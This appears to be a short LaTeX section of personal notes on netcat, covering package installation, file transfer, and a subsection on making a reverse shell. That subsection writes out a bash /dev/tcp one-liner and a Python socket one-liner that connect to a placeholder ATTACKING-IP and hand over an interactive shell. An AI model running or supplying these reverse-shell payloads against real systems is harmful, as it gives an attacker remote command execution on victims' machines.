\section{netcat}

Netcat is a featured networking utility which reads and writes data across
network connections, using the TCP/IP protocol.

\subsection{installation}

\begin{verbatim}
yum erase nc
wget http://vault.centos.org/6.6/os/x86_64/Packages/nc-1.84-22.el6.x86_64.rpm
rpm -iUv nc-1.84-22.el6.x86_64.rpm
\end{verbatim}

\subsection{file transfer}
\begin{verbatim}
receiver# nc -l 1236 > file_to_receive
sender#nc $receiver_ip 1236 < file_to_send
\end{verbatim}

\subsection{making a reverse shell}
On source host, start a netcat listening on some port:
\begin{verbatim}
nc -l ATTACKING-IP 80
\end{verbatim}
ATTACKING-IP can be ommited.

On target host, connect to this port:
\begin{verbatim}
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
\end{verbatim}

Now the source host can execute any command on the target.

This can set up a communication channel by which the source can send messages to
the target.
\begin{lstlisting}
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
\end{lstlisting}

Here is a \href{https://highon.coffee/blog/reverse-shell-cheat-sheet/}{reverse
shell cheatsheet} for other techniques.




